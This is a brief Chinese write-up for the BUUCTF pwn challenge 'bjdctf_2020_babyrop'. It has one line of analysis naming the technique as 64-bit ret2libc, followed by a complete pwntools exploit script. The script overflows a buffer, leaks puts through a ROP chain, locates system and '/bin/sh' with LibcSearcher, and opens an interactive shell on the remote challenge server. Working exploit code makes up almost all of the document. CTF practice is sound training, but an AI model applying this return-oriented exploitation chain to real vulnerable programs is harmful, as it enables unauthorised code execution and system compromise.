# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

这是一道ret2libc(64位)，checksec一下

# exp

```python
from pwn import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
#p=process('./bjdctf_2020_babyrop')
elf=ELF('./bjdctf_2020_babyrop')
p=remote('node5.buuoj.cn',28171)
main_addr=elf.sym['main']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
ret_addr=0x4004c9
pop_rdi=0x400733
payload=flat(cyclic(0x28),p64(pop_rdi),p64(puts_got),p64(puts_plt),p64(main_addr))
p.sendlineafter('story!\n',payload)
puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')
system_addr=base+libc.dump('system')
bin_sh=base+libc.dump('str_bin_sh')
print(hex(system_addr))
print(hex(bin_sh))

payload2=flat(cyclic(0x28),p64(ret_addr),p64(pop_rdi),p64(bin_sh),p64(system_addr))
p.sendline(payload2)
p.interactive()
```

